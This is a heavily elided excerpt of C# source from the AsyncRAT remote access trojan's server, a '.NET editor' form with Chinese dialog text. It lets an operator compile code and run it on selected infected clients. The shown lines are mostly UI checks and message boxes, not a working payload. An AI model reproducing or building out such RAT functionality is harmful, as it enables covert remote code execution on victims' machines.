...
namespace Server.Forms
{
    public partial class FormDotNetEditor : Form
    {
        ...
        private void Button1_Click(object sender, EventArgs e)
        {
            ...
            if (!txtBox.Text.ToLower().Contains("try") && !txtBox.Text.ToLower().Contains("catch")) MessageBox.Show("请添加try catch", "AsyncRAT | .NET编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            ...
            if (Program.form1.listView1.SelectedItems.Count > 0)
            {
                ...
                MessageBox.Show("执行！", "AsyncRAT | .NET编辑器", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                MessageBox.Show("未选择客户端!", "AsyncRAT | .NET编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
        }
        ...
        private void Compiler(CodeDomProvider codeDomProvider, string source, string[] referencedAssemblies)
        {
            try
            {
                ...
                else
                {
                    ...
                    MessageBox.Show("无错误!", "AsyncRAT | .NET编辑器", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | .NET编辑器", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            finally
            {
                //GC.Collect();
